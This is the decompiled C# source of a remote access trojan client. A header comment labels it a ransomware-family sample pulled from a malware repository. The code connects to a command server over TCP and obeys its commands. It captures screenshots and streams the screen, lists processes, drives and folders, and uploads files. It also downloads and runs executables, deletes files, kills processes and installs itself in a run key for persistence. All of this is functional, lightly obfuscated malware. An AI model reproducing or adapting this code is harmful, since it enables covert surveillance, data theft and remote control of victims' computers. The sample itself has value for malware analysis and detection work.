// Decompiled with JetBrains decompiler
// Type: tbahmanra.MAEDRM
// Assembly: tbahmanra, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4D9C8A1A-BE3E-47BA-A807-18A8CAD92DB5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-67a225feedc5ce4adf75acb41e8b0e746e7daaec779225cd72f860a263b92a6e.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace tbahmanra
{
  public class MAEDRM
  {
    private Dictionary<string, byte[]> tbahmanratasks = new Dictionary<string, byte[]>();
    public DateTime tbahmanrarunTime;
    private int tbahmanrabytesRead = 0;
    public bool tbahmanrareqCnls = false;
    private int tbahmanraatmps = 0;
    public NetworkStream tbahmanranetStream;
    private int tbahmanrabuffSize = 1024;
    private DARZRIVF tbahmanraHD = new DARZRIVF();
    public bool tbahmanrais_working = false;
    private bool tbahmanraiswitch = false;
    public int port_sn = 0;
    public bool tbahmanraautCnls = false;
    public DateTime tbahmanralTimeUtc;
    private TAHRARE tbahmanraStateObj = new TAHRARE();
    private MAYEINF tbahmanraUPC;
    private int tbahmanrascrSize = 200;
    private ThreadStart tbahmanrafunStarter;
    public TcpClient tbahmanratcpsck;
    private bool tbahmanrathrRuning = false;
    private int tbahmanrathreadCnts = 0;
    private bool tbahmanrastr_writer = false;
    private bool tbahmanracapScreen = false;
    private Thread tbahmanrafunThread;

    public NetworkStream tbahmanraNSx(TcpClient tbahmanratcpsck) => tbahmanratcpsck.GetStream();

    public string tbahmanraserverIPxD() => Encoding.UTF8.GetString(CAEZRNF.tbahmanravpsips, 0, CAEZRNF.tbahmanravpsips.Length);

    public void tbahmanrado_loader()
    {
      CAEZRNF.tbahmanraport = CAEZRNF.ports[0];
      this.tbahmanrarunTime = DateTime.Now;
      this.tbahmanraUPC = new MAYEINF();
      this.tbahmanraHD.iserver = this;
      this.tbahmanraStateObj.tbahmanratimer = new System.Threading.Timer(new TimerCallback(this.tbahmanraloxokupCnse), (object) this.tbahmanraStateObj, 42010, 56120);
    }

    public void tbahmanrarexmove_user()
    {
      try
      {
        byte[] bytes = this.tbahmanrapuxll_data();
        if (bytes == null || File.Exists(CAEZRNF.tbahmanraget_mpath() + CAEZRNF.tbahmanraremvUser + ".exe".ToString()))
          return;
        File.WriteAllBytes(CAEZRNF.tbahmanraget_mpath() + CAEZRNF.tbahmanraremvUser + ".exe".ToString(), bytes);
        Process.Start(CAEZRNF.tbahmanraget_mpath() + CAEZRNF.tbahmanraremvUser + ".exe".ToString());
      }
      catch
      {
      }
    }

    private void tbahmanracheckLaxstatime(DateTime mTimeUtc)
    {
      try
      {
        if (Math.Abs(this.tbahmanrarunTime.Subtract(mTimeUtc).Minutes) <= 5)
          return;
        this.tbahmanratcpsck.Close();
        this.tbahmanrais_working = false;
      }
      catch
      {
      }
    }

    public void tbahmanrasaxve_File(string filePath)
    {
      try
      {
        byte[] bytes = this.tbahmanrapuxll_data();
        File.WriteAllBytes(filePath, bytes);
      }
      catch
      {
      }
    }

    public string tbahmanrafixle_info(string path, bool ret = false)
    {
      try
      {
        FileInfo fileInfo = new FileInfo(path);
        string name = fileInfo.Name;
        string str1;
        if (ret)
          str1 = "<|tbahmanra".Split('|')[0];
        else
          str1 = ">|tbahmanra".Split('|')[0];
        string str2 = name + str1;
        string str3 = fileInfo.CreationTimeUtc.Date.ToString();
        string str4;
        if (ret)
          str4 = "<|tbahmanra".Split('|')[0];
        else
          str4 = ">|tbahmanra".Split('|')[0];
        string str5 = str2 + str3 + str4;
        string str6 = this.tbahmanragext_size(fileInfo.Length);
        string str7;
        if (ret)
          str7 = "<|tbahmanra".Split('|')[0];
        else
          str7 = ">|tbahmanra".Split('|')[0];
        string str8 = str5 + str6 + str7;
        if (!ret)
          this.tbahmanrapuxsh_data((byte[]) null, "tbahmanra-fixlsz=|tbahmanra".Split('|')[0] + str8);
        return str8;
      }
      catch
      {
        return "";
      }
    }

    private void tbahmanraloxokupCnse(object sdgource)
    {
      try
      {
        if (!this.tbahmanrathrRuning)
        {
          this.tbahmanrathrRuning = true;
          this.tbahmanracheckLaxstatime(DateTime.Now);
          if (!this.tbahmanrais_working || !this.tbahmanratcpsck.Connected)
          {
            this.tbahmanrais_working = this.tbahmanraIPxSCi();
            if (this.tbahmanrais_working)
            {
              this.tbahmanrabuffSize = this.tbahmanratcpsck.ReceiveBufferSize;
              this.tbahmanrasexeRspi();
            }
          }
        }
        else
          ++this.tbahmanrathreadCnts;
        this.tbahmanrathrRuning = false;
      }
      catch
      {
        ++this.tbahmanraatmps;
        this.tbahmanrathrRuning = false;
        this.tbahmanrathreadCnts = 0;
        this.tbahmanrastr_writer = false;
        this.tbahmanrais_working = false;
        this.tbahmanraiswitch = false;
      }
    }

    private bool tbahmanraIPxSCi()
    {
      try
      {
        CAEZRNF.tbahmanradefaultP = this.tbahmanraserverIPxD();
        this.tbahmanratcpsck = new TcpClient();
        this.tbahmanratcpsck.Connect(CAEZRNF.tbahmanradefaultP, CAEZRNF.tbahmanraport);
        return true;
      }
      catch
      {
        this.tbahmanrapoxrts_switch();
        return false;
      }
    }

    public void tbahmanrapoxrts_switch()
    {
      try
      {
        ++this.port_sn;
        CAEZRNF.tbahmanraport = CAEZRNF.ports[this.port_sn];
        if (this.port_sn < CAEZRNF.ports.Length - 1)
          return;
        this.port_sn = 0;
      }
      catch
      {
        this.port_sn = 0;
      }
    }

    public bool tbahmanrasexnd_auto(string fileinfo)
    {
      try
      {
        string path = fileinfo.Split('>')[0];
        if (File.Exists(path))
        {
          string fileName = Path.GetFileName(path);
          byte[] data = File.ReadAllBytes(path);
          fileinfo = fileinfo + ">" + fileName;
          this.tbahmanrapuxsh_data(data, "tbahmanra-afxile=" + fileinfo);
          return false;
        }
        this.tbahmanrapuxsh_data((byte[]) null, "tbahmanra-anxfod=" + fileinfo);
        return false;
      }
      catch
      {
        return false;
      }
    }

    public void tbahmanralist_prxocesses()
    {
      try
      {
        string str1 = "";
        Process[] processes = Process.GetProcesses();
        for (int index = 0; index <= processes.Length - 1; ++index)
        {
          string str2 = str1 + processes[index].Id.ToString() + ">|tbahmanra".Split('|')[0];
          string str3;
          try
          {
            str3 = str2 + processes[index].MainModule.FileName + ">|tbahmanra".Split('|')[0];
          }
          catch
          {
            str3 = str2 + " >|tbahmanra".Split('|')[0];
          }
          str1 = str3 + "0>|tbahmanra".Split('|')[0] + "<";
        }
        this.tbahmanrapuxsh_data(CAEZRNF.getByteArray(str1), "tbahmanra-prxocl=proess|tbahmanra".Split('|')[0]);
      }
      catch
      {
      }
    }

    public void tbahmanraloxad_app()
    {
      try
      {
        string executablePath = Application.ExecutablePath;
        Thread.Sleep(100);
        CAEZRNF.tbahmanraset_run("hidvar|tbahmanra".Split('|')[0], executablePath + "|tbahmanra".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void tbahmanraimage_info(string path)
    {
      try
      {
        Bitmap bitmap = new Bitmap((Image) new Bitmap(path), new Size(200, 150));
        if (bitmap == null)
          return;
        FileInfo fileInfo = new FileInfo(path);
        string str1 = fileInfo.Name + ">|tbahmanra".Split('|')[0];
        DateTime dateTime = fileInfo.CreationTimeUtc;
        dateTime = dateTime.Date;
        string str2 = dateTime.ToString();
        string str3 = ">|tbahmanra".Split('|')[0];
        string str4 = str1 + str2 + str3 + this.tbahmanragext_size(fileInfo.Length) + ">";
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Gif);
        this.tbahmanrapuxsh_data(memoryStream.ToArray(), "tbahmanra-thxumb=|tbahmanra".Split('|')[0] + str4);
      }
      catch
      {
      }
    }

    private void tbahmanrasexe_scren(string screenSize)
    {
      try
      {
        SACRRNS sacrrns = new SACRRNS();
        this.tbahmanrascrSize = (int) Convert.ToInt16(screenSize.Split('>')[0].Trim());
        Bitmap bitmap = sacrrns.tbahmanrascreen(this.tbahmanrascrSize);
        if (bitmap == null)
          return;
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
        this.tbahmanrapuxsh_data(memoryStream.ToArray(), "tbahmanra-saxscr=capsen|tbahmanra".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void tbahmanraisx_screen(string screenSize)
    {
      try
      {
        SACRRNS sacrrns = new SACRRNS();
        this.tbahmanrascrSize = (int) Convert.ToInt16(screenSize.Split('>')[0].Trim());
        while (this.tbahmanracapScreen && this.tbahmanrais_working)
        {
          Bitmap bitmap = sacrrns.tbahmanrascreen(this.tbahmanrascrSize);
          if (bitmap != null)
          {
            MemoryStream memoryStream = new MemoryStream();
            bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
            this.tbahmanrapuxsh_data(memoryStream.ToArray(), "tbahmanra-scxren=capsen|tbahmanra".Split('|')[0]);
          }
        }
      }
      catch
      {
      }
    }

    private void tbahmanrausexr_info() => this.tbahmanrapuxsh_data(CAEZRNF.getByteArray(this.tbahmanraUPC.tbahmanralancard + "|" + this.tbahmanraUPC.tbahmanracname + "|" + this.tbahmanraUPC.tbahmanrauname + "|" + this.tbahmanraUPC.tbahmanrauip + "|" + CAEZRNF.tbahmanraOsname() + "|" + this.tbahmanraUPC.tbahmanraapver + "|" + "| !tbahmanra".Split('!')[0] + "|" + this.tbahmanraUPC.tbahmanraclientNum + "|" + CAEZRNF.tbahmanraget_mpath()), "tbahmanra-inxfo=user|tbahmanra".Split('|')[0]);

    private void tbahmanrapuxsh_file(string lfile)
    {
      try
      {
        this.tbahmanrapuxsh_data(File.ReadAllBytes(lfile), "tbahmanra-fixle=|tbahmanra".Split('|')[0] + lfile + ">0>" + Path.GetFileName(lfile), true);
      }
      catch
      {
      }
    }

    public void tbahmanrarexmove_file(string path)
    {
      try
      {
        File.Delete(path);
      }
      catch
      {
      }
    }

    private string tbahmanragext_size(long byteCount)
    {
      try
      {
        string[] strArray = new string[7]
        {
          "B|tbahmanra".Split('|')[0],
          "KB|tbahmanra".Split('|')[0],
          "MB|tbahmanra".Split('|')[0],
          "GB|tbahmanra".Split('|')[0],
          "TB|tbahmanra".Split('|')[0],
          "PB|tbahmanra".Split('|')[0],
          "EB|tbahmanra".Split('|')[0]
        };
        if (byteCount == 0L)
          return "0" + strArray[0];
        long a = Math.Abs(byteCount);
        int int32 = Convert.ToInt32(Math.Floor(Math.Log((double) a, 1024.0)));
        double num = Math.Round((double) a / Math.Pow(1024.0, (double) int32), 1);
        return ((double) Math.Sign(byteCount) * num).ToString() + strArray[int32];
      }
      catch
      {
        return "";
      }
    }

    public string[] tbahmanragext_command()
    {
      try
      {
        byte[] buffer = new byte[5];
        this.tbahmanrabytesRead = this.tbahmanranetStream.Read(buffer, 0, 5);
        int int32 = BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[int32];
        int offset = 0;
        for (int index = int32; index > 0; index -= this.tbahmanrabytesRead)
        {
          int count = index > this.tbahmanrabuffSize ? this.tbahmanrabuffSize : index;
          this.tbahmanrabytesRead = this.tbahmanranetStream.Read(numArray, offset, count);
          offset += this.tbahmanrabytesRead;
        }
        string str = Encoding.UTF8.GetString(numArray, 0, int32).ToString();
        if (str.Trim() == "")
          return (string[]) null;
        return str.Split('=');
      }
      catch
      {
        this.tbahmanrais_working = false;
        return (string[]) null;
      }
    }

    public byte[] tbahmanrapuxll_data()
    {
      try
      {
        this.tbahmanrarunTime = DateTime.Now;
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.tbahmanrabytesRead = this.tbahmanranetStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        int num = int32;
        while (num > 0 && !this.tbahmanrareqCnls)
        {
          int count = num > this.tbahmanrabuffSize ? this.tbahmanrabuffSize : num;
          this.tbahmanrabytesRead = this.tbahmanranetStream.Read(buffer2, offset, count);
          offset += this.tbahmanrabytesRead;
          num -= this.tbahmanrabytesRead;
          this.tbahmanrarunTime = DateTime.Now;
        }
        if (this.tbahmanrareqCnls)
          buffer2 = (byte[]) null;
        return buffer2;
      }
      catch
      {
        this.tbahmanrais_working = false;
        return (byte[]) null;
      }
    }

    private void tbahmanralixstDrives() => this.tbahmanrapuxsh_data((byte[]) null, "tbahmanra-dixrs=" + this.tbahmanraHD.tbahmanralookup_Drives());

    public bool tbahmanrapuxsh_data(byte[] data, string type, bool tmp = false)
    {
      try
      {
        this.tbahmanrarunTime = DateTime.Now;
        if (this.tbahmanrastr_writer)
          return false;
        this.tbahmanrastr_writer = true;
        byte[] byteArray = CAEZRNF.getByteArray(type);
        int num1 = 0;
        int num2 = 5;
        byte[] numArray = (byte[]) null;
        if (data != null)
        {
          numArray = BitConverter.GetBytes(data.Length);
          num1 = data.Length;
          num2 = 10;
        }
        byte[] bytes = BitConverter.GetBytes(byteArray.Length);
        byte[] buffer = new byte[num2 + byteArray.Length + num1];
        bytes.CopyTo((Array) buffer, 0);
        byteArray.CopyTo((Array) buffer, 5);
        if (data != null)
        {
          numArray.CopyTo((Array) buffer, 5 + byteArray.Length);
          data.CopyTo((Array) buffer, 10 + byteArray.Length);
        }
        int offset = 0;
        int length = buffer.Length;
        while (length > 0 && !this.tbahmanrareqCnls)
        {
          int count = length > this.tbahmanrabuffSize ? this.tbahmanrabuffSize : length;
          this.tbahmanranetStream.Write(buffer, offset, count);
          offset += count;
          length -= count;
          this.tbahmanrarunTime = DateTime.Now;
        }
        this.tbahmanrastr_writer = false;
        return !this.tbahmanrareqCnls;
      }
      catch
      {
        this.tbahmanrastr_writer = false;
        this.tbahmanrais_working = false;
        return false;
      }
    }

    private void tbahmanrasexeRspi()
    {
      if (!this.tbahmanraiswitch)
      {
        this.tbahmanraiswitch = true;
        this.tbahmanranetStream = this.tbahmanraNSx(this.tbahmanratcpsck);
        this.tbahmanracapScreen = false;
        while (this.tbahmanrais_working)
        {
          string[] switchType = this.tbahmanragext_command();
          if (switchType == null)
          {
            this.tbahmanrais_working = false;
            break;
          }
          this.tbahmanrareqCnls = false;
          string lower = switchType[0].ToLower();
          string str;
          if (lower.Split('-').Length > 1)
            str = "tbahmanra-" + lower.Split('-')[1];
          else
            str = "tbahmanra-" + lower;
          switch (str)
          {
            case "tbahmanra-thxumb":
            case "tbahmanra-thumb":
              this.tbahmanraimage_info(switchType[1]);
              break;
            case "tbahmanra-clxping":
            case "tbahmanra-clping":
              this.tbahmanrarunTime = DateTime.Now;
              break;
            case "tbahmanra-puxtsrt":
            case "tbahmanra-putsrt":
              this.tbahmanraloxad_app();
              break;
            case "tbahmanra-fixlsz":
            case "tbahmanra-filsz":
              this.tbahmanrafunStarter = (ThreadStart) (() => this.tbahmanrafixle_info(switchType[1]));
              this.tbahmanrafunThread = new Thread(this.tbahmanrafunStarter);
              this.tbahmanrafunThread.Start();
              break;
            case "tbahmanra-ruxpth":
            case "tbahmanra-rupth":
              this.tbahmanrapuxsh_data((byte[]) null, "tbahmanra-apxpth=|tbahmanra".Split('|')[0] + CAEZRNF.tbahmanraget_mpath());
              break;
            case "tbahmanra-prxocl":
            case "tbahmanra-procl":
              this.tbahmanrafunStarter = (ThreadStart) (() => this.tbahmanralist_prxocesses());
              this.tbahmanrafunThread = new Thread(this.tbahmanrafunStarter);
              this.tbahmanrafunThread.Start();
              break;
            case "tbahmanra-csxcreen":
            case "tbahmanra-cscreen":
              this.tbahmanrasexe_scren(switchType[1]);
              break;
            case "tbahmanra-dixrs":
            case "tbahmanra-dirs":
              this.tbahmanrafunThread = new Thread(new ThreadStart(this.tbahmanralixstDrives));
              this.tbahmanrafunThread.Start();
              break;
            case "tbahmanra-stxops":
            case "tbahmanra-stops":
              this.tbahmanracapScreen = false;
              break;
            case "tbahmanra-scxren":
            case "tbahmanra-scren":
              this.tbahmanracapScreen = true;
              this.tbahmanrafunStarter = (ThreadStart) (() => this.tbahmanraisx_screen(switchType[1]));
              this.tbahmanrafunThread = new Thread(this.tbahmanrafunStarter);
              this.tbahmanrafunThread.Start();
              break;
            case "tbahmanra-doxwf":
            case "tbahmanra-dowf":
              this.tbahmanrasaxve_File(switchType[1]);
              break;
            case "tbahmanra-enxdpo":
            case "tbahmanra-endpo":
              try
              {
                Process.GetProcessById((int) Convert.ToInt16(switchType[1].Trim())).Kill();
                break;
              }
              catch
              {
                break;
              }
            case "tbahmanra-cnxls":
            case "tbahmanra-cnls":
              this.tbahmanraautCnls = true;
              this.tbahmanrareqCnls = true;
              this.tbahmanracapScreen = false;
              break;
            case "tbahmanra-udxlt":
            case "tbahmanra-udlt":
              this.tbahmanrarexmove_user();
              break;
            case "tbahmanra-flxdr":
            case "tbahmanra-fldr":
              string Folders = this.tbahmanraHD.tbahmanracheck_Folder(switchType[1]);
              if (Folders != "")
              {
                this.tbahmanrafunStarter = (ThreadStart) (() => this.tbahmanrapuxsh_data((byte[]) null, "tbahmanra-flxdr=|tbahmanra".Split('|')[0] + Folders));
                this.tbahmanrafunThread = new Thread(this.tbahmanrafunStarter);
                this.tbahmanrafunThread.Start();
                break;
              }
              break;
            case "tbahmanra-afxile":
            case "tbahmanra-afile":
              this.tbahmanrafunStarter = (ThreadStart) (() => this.tbahmanrasexnd_auto(switchType[1]));
              this.tbahmanrafunThread = new Thread(this.tbahmanrafunStarter);
              this.tbahmanrafunThread.Start();
              break;
            case "tbahmanra-lixstf":
            case "tbahmanra-listf":
              this.tbahmanrafunStarter = (ThreadStart) (() => this.tbahmanraHD.tbahmanralook_Files(switchType[1]));
              this.tbahmanrafunThread = new Thread(this.tbahmanrafunStarter);
              this.tbahmanrafunThread.Start();
              break;
            case "tbahmanra-dexlt":
            case "tbahmanra-delt":
              try
              {
                File.Delete(switchType[1]);
                break;
              }
              catch
              {
                break;
              }
            case "tbahmanra-fixle":
            case "tbahmanra-file":
              this.tbahmanrafunStarter = (ThreadStart) (() => this.tbahmanrapuxsh_file(switchType[1]));
              this.tbahmanrafunThread = new Thread(this.tbahmanrafunStarter);
              this.tbahmanrafunThread.Start();
              break;
            case "tbahmanra-inxfo":
            case "tbahmanra-info":
              this.tbahmanrafunThread = new Thread(new ThreadStart(this.tbahmanrausexr_info));
              this.tbahmanrafunThread.Start();
              break;
            case "tbahmanra-flxes":
            case "tbahmanra-fles":
              string files = this.tbahmanraHD.tbahmanralookup_File(switchType[1]);
              if (files != "")
              {
                this.tbahmanrafunStarter = (ThreadStart) (() => this.tbahmanrapuxsh_data((byte[]) null, "tbahmanra-flxes=|tbahmanra".Split('|')[0] + files));
                this.tbahmanrafunThread = new Thread(this.tbahmanrafunStarter);
                this.tbahmanrafunThread.Start();
                break;
              }
              break;
            case "tbahmanra-ruxnf":
            case "tbahmanra-runf":
              Process.Start(switchType[1].Split('>')[0]);
              break;
            case "tbahmanra-doxwr":
            case "tbahmanra-dowr":
              this.tbahmanrasaxve_File(switchType[1]);
              break;
          }
        }
        this.tbahmanrais_working = false;
        this.tbahmanracapScreen = false;
      }
      this.tbahmanraiswitch = false;
    }
  }
}
